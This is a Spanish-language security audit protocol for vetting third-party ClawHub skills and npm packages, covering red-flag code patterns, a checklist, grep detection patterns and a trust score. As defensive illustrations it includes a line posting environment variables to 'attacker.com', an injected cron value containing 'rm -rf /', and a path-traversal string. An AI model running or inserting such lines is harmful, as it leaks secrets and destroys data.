# 🔐 Third-Party Security Audit Protocol — 2026-02-21

**Objetivo:** Auditar cualquier skill/code tercero ANTES de instalarlo en VPS  
**Enfoque:** Prompt injection, data exfiltration, malicious code  
**Aplicable a:** ClawHub skills, npm packages, scripts externos

---

## 🚨 **RED FLAGS CRÍTICAS (Rechazo inmediato)**

### 1. **Prompt Injection Vectors**
```bash
# 🔴 RED FLAG: Concatenación directa de user input
message = "Ask the user: " + user_input + " Then execute..."
# Riesgo: Prompt injection brutal

# 🔴 RED FLAG: No escaping de símbolos especiales
cmd = f"rclone {user_path}"  # Sin sanitización
# Riesgo: Command injection vía {user_path}

# 🟢 SEGURO: Input validation + escaping
if not user_input.startswith(('/home', '/tmp')):
    raise ValueError("Invalid path")
sanitized = shlex.quote(user_path)
```

### 2. **Exfiltración de Datos**
```bash
# 🔴 RED FLAG: Send data a servidores externos sin consentimiento
requests.post("https://attacker.com/logs", data=os.environ)
# Riesgo: Robo de API keys, secrets

# 🔴 RED FLAG: Logging de datos sensibles
logger.debug(f"API_KEY={os.getenv('API_KEY')}")
# Riesgo: Secrets en logs públicos

# 🟢 SEGURO: Logging sanitizado
logger.debug(f"API_KEY={os.getenv('API_KEY', '')[:4]}****")
```

### 3. **Code Execution Vulnerabilities**
```bash
# 🔴 RED FLAG: eval() con input del usuario
eval(user_input)  # ¡¡NUNCA!!

# 🔴 RED FLAG: Desserialización insegura
pickle.loads(untrusted_data)
yaml.load(untrusted_data)  # Sin Loader=yaml.SafeLoader

# 🟢 SEGURO: SafeLoader
yaml.load(untrusted_data, Loader=yaml.SafeLoader)
```

### 4. **Dependencies Maliciosas**
```bash
# 🔴 RED FLAG: Dependencia oscura sin uso claro
"some-obscure-pkg": "^1.0.0"

# 🔴 RED FLAG: Dependencies con últimas actualización hace 3+ años
git log --oneline upstream | head -1  # Resultado: "2 years ago"

# 🟢 SEGURO: Dependencies que se actualizan regularmente
git log --oneline upstream | head -1  # Resultado: "2 weeks ago"
```

---

## 📋 **CHECKLIST DE AUDITORÍA ANTES DE INSTALAR**

### **Paso 1: Reconocimiento (5 min)**
- [ ] ¿Quién es el creador? ¿Reputación conocida en OpenClaw?
- [ ] ¿Cuántas descargas/stars? (>1000 = más confianza)
- [ ] ¿Última actualización? (< 1 año = bien, > 2 años = sospechoso)
- [ ] ¿Tiene tests? (`tests/`, `.github/workflows/`)
- [ ] ¿Licencia clara? (MIT, GPL, etc.)

### **Paso 2: Dependency Chain (5 min)**
```bash
clawhub info skill-name  # Ver dependencias
npm ls --all  # Árbol completo de deps
```
- [ ] ¿Dependencias conocidas y confiables?
- [ ] ¿Número de deps < 10? (más = más riesgo)
- [ ] ¿Deps deprecadas? (`npm deprecate`)

### **Paso 3: Código Source Review (10-20 min)**
- [ ] **Inputs:** ¿Valida user input?
- [ ] **Outputs:** ¿Loguea datos sensibles?
- [ ] **Network:** ¿Hace requests externos? ¿A dónde?
- [ ] **File I/O:** ¿Lee/escribe archivos? ¿Dónde?
- [ ] **Environment:** ¿Accede a env vars? ¿Cuáles?
- [ ] **Execution:** ¿Corre shell commands? ¿Usa shlex.quote()?

### **Paso 4: Prompt Injection Específica (10 min)**
```bash
# Buscar estos patrones:
grep -r "f\".*{.*}.*\"" .  # f-strings con variables
grep -r "format(.*input" .  # .format() con input
grep -r "concatenat" .  # "concatenat" strings
grep -r "eval\|exec\|compile" .  # Code execution
grep -r "pickle\|marshal" .  # Desserialización insegura
```

### **Paso 5: Sandbox Testing (5 min)**
```bash
# En VM aislada:
clawhub install skill-name --workdir /tmp/sandbox
# Monitorear:
  - Network calls (tcpdump)
  - File access (strace)
  - Environment vars (env | grep .)
```

---

## 🔍 **PATRONES A AUDITAR (Específicos a ClawHub)**

### **Prompt Injection en Message Payloads**
```python
# 🔴 MALO:
payload = {
    "kind": "agentTurn",
    "message": f"Do this: {user_instruction}"  # INJECTION RISK
}

# 🟢 BUENO:
payload = {
    "kind": "agentTurn",
    "message": "Do this: [USER_INPUT_PLACEHOLDER]"
}
# Luego, en runtime:
payload["message"] = payload["message"].replace(
    "[USER_INPUT_PLACEHOLDER]",
    sanitize_instruction(user_instruction)
)
```

### **File Path Traversal**
```python
# 🔴 MALO:
backup_path = f"/backups/{user_folder}/{filename}"
# Risk: user_folder = "../../secret/"

# 🟢 BUENO:
import os
base_path = "/backups"
user_path = os.path.join(base_path, user_folder)
if not os.path.abspath(user_path).startswith(base_path):
    raise ValueError("Path traversal attempt blocked")
```

### **Cron Job Injection**
```bash
# 🔴 MALO:
cron_expr = f"0 {user_hour} * * *"  # Si user_hour = "23; rm -rf /"

# 🟢 BUENO:
if not user_hour.isdigit() or not 0 <= int(user_hour) <= 23:
    raise ValueError("Invalid hour")
cron_expr = f"0 {user_hour} * * *"
```

---

## 📊 **SCORING DE CONFIANZA**

### **Skill Confianza Score**
```
Base: 0 puntos

+ 20 pts:  Creador con >5 skills publicados + >1000 descargas total
+ 15 pts:  Actualizado en últimos 3 meses
+ 10 pts:  Tests (`test/` o `.github/workflows/`)
+ 10 pts:  Licencia clara (MIT, GPL)
+ 10 pts:  <10 dependencias directas
+ 10 pts:  README detallado + ejemplos

- 30 pts:  No valida input (prompt injection)
- 30 pts:  Hace requests a servidores desconocidos
- 20 pts:  Loguea secrets/env vars
- 20 pts:  Usa eval/exec/pickle
- 15 pts:  >20 dependencias
- 10 pts:  Última actualización >1 año

SCORE FINAL:
  80+     = VERDE - Instalar con confianza
  50-79   = AMARILLO - Auditar antes, usar con cuidado
  <50     = ROJO - Rechazar o reescribir
```

---

## 🛡️ **PROTOCOLO ANTES DE INSTALAR TERCEROS**

1. **Auditoría:** Run full checklist (Paso 1-5)
2. **Scoring:** Calcular confianza score
3. **Si ROJO:** Rechazar o fork + parchear
4. **Si AMARILLO:** Documento de riesgos + testing en sandbox
5. **Si VERDE:** Instalar + monitorear en producción
6. **Post-install:** Monitorear network/file access

---

## 📝 **TEMPLATE: Audit Report**

```markdown
# Skill Audit Report: [skill-name]

**Date:** YYYY-MM-DD
**Score:** XX/100 (VERDE/AMARILLO/ROJO)

## Findings

### ✅ Strengths
- ...

### ⚠️ Concerns
- ...

### 🔴 Issues
- ...

## Recommendation
- APPROVED / APPROVED_WITH_CAVEATS / REJECTED

## Action Items
- [ ] ...
```

---

**Implementación:** 2026-02-21  
**Aplicable a:** Cualquier skill ClawHub o code tercero antes de instalar
